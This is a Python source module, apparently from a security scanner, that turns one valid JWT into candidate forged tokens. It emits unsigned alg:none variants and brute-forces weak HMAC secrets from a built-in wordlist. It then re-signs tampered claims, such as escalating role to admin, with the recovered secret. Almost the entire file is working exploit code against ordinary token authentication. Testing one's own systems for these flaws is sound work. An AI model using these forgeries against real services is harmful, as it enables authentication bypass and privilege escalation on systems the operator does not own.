"""JWT forgery generators — turn one valid token into candidate forgeries.

Two self-contained, soundly-confirmable attack families (each forgery is only a
*candidate* until the server accepts it — see :mod:`core.jwt.oracle`):

  * **alg:none** — RFC-permitted "unsecured JWS". A server that honours it accepts
    a token with no signature, so any claim can be set. We emit the common
    case-variants (``none``/``None``/``NONE``/``nOnE``) libraries have historically
    mis-matched.
  * **weak HMAC secret** — if the token is HS*, brute a wordlist against its own
    signature; a hit means we can mint arbitrary tokens. We then re-sign a
    *tampered* payload with the recovered secret.

A forgery carries a tampered claim (a bumped ``exp`` and/or an operator-specified
change such as escalating ``role``/``sub``) so acceptance is not just "a token
works" but "a token WE controlled the claims of works".
"""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Sequence

from core.jwt.tokens import decode, encode, sign_hmac, signing_input, verify_hmac

# Secrets seen over and over in weak deployments (dev leftovers, tutorials,
# framework defaults). Small on purpose: this is a soundness probe, not a cracker.
DEFAULT_SECRETS: List[str] = [
    "secret", "password", "123456", "changeme", "admin", "key", "jwt", "token",
    "secretkey", "supersecret", "your-256-bit-secret", "your_jwt_secret",
    "s3cr3t", "test", "qwerty", "jwtsecret", "mysecret", "default", "root",
    "iloveyou", "letmein", "P@ssw0rd", "example_key", "0", "null",
]

_ALG_NONE_VARIANTS = ("none", "None", "NONE", "nOnE")


@dataclass
class Forgery:
    """One candidate forged token + how it was produced (for evidence)."""

    token: str
    attack: str                      # jwt_alg_none | jwt_weak_secret
    vuln_class: str
    detail: Dict[str, Any] = field(default_factory=dict)


def tamper_claims(payload: Dict[str, Any],
                  changes: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
    """Return a copy of ``payload`` with a future ``exp`` and any ``changes`` applied.

    ``exp`` is bumped only if present (kept a fixed far-future constant so tokens
    are deterministic — no wall-clock in tests). ``changes`` escalate identity
    claims (e.g. ``{"role": "admin"}``); unknown keys are simply set.
    """
    out = dict(payload)
    if "exp" in out:
        out["exp"] = 4102444800          # 2100-01-01, comfortably un-expired
    for k, v in (changes or {}).items():
        out[k] = v
    return out


def alg_none_variants(header: Dict[str, Any], payload: Dict[str, Any],
                      changes: Optional[Dict[str, Any]] = None) -> List[Forgery]:
    """Forge unsigned tokens across the ``none`` case-variants."""
    tampered = tamper_claims(payload, changes)
    out: List[Forgery] = []
    for variant in _ALG_NONE_VARIANTS:
        h = dict(header); h["alg"] = variant
        out.append(Forgery(
            token=encode(h, tampered, b""), attack="jwt_alg_none",
            vuln_class="jwt_alg_none",
            detail={"alg": variant, "tampered_claims": changes or {}}))
    return out


def recover_hmac_secret(token: str,
                        wordlist: Sequence[str] = DEFAULT_SECRETS) -> Optional[str]:
    """Return the first wordlist secret that verifies ``token``'s HS* signature."""
    for secret in wordlist:
        if verify_hmac(token, secret):
            return secret
    return None


def weak_secret_forgery(header: Dict[str, Any], payload: Dict[str, Any],
                        secret: str,
                        changes: Optional[Dict[str, Any]] = None) -> Forgery:
    """Sign a tampered payload with a recovered weak secret (same HS* alg)."""
    alg = str(header.get("alg", "HS256")).upper()
    tampered = tamper_claims(payload, changes)
    si = signing_input(header, tampered)
    sig = sign_hmac(si, secret, alg)
    return Forgery(token=encode(header, tampered, sig), attack="jwt_weak_secret",
                   vuln_class="jwt_weak_secret",
                   detail={"alg": alg, "secret": secret, "tampered_claims": changes or {}})


def generate_forgeries(token: str, *, changes: Optional[Dict[str, Any]] = None,
                       wordlist: Sequence[str] = DEFAULT_SECRETS) -> List[Forgery]:
    """All candidate forgeries for ``token`` (alg:none always; weak-secret if HS*)."""
    header, payload, _sig, _si = decode(token)
    forgeries = alg_none_variants(header, payload, changes)
    alg = str(header.get("alg", "")).upper()
    if alg.startswith("HS"):
        secret = recover_hmac_secret(token, wordlist)
        if secret is not None:
            forgeries.append(weak_secret_forgery(header, payload, secret, changes))
    return forgeries


def corrupt_signature(token: str) -> str:
    """A negative control: the same token with a wrecked signature (must be rejected).

    Flips the signature segment so a validating server denies it — proving the
    endpoint checks signatures at all (without this control, an endpoint that
    accepts anything would look like a forgery bypass).
    """
    parts = token.split(".")
    if len(parts) != 3:
        return token + "AAAA"
    sig = parts[2] or "AAAA"
    # perturb the last char deterministically so the HMAC no longer matches
    flipped = ("B" if sig[-1] != "B" else "C")
    parts[2] = sig[:-1] + flipped
    return ".".join(parts)


__all__ = [
    "DEFAULT_SECRETS", "Forgery", "tamper_claims", "alg_none_variants",
    "recover_hmac_secret", "weak_secret_forgery", "generate_forgeries",
    "corrupt_signature",
]
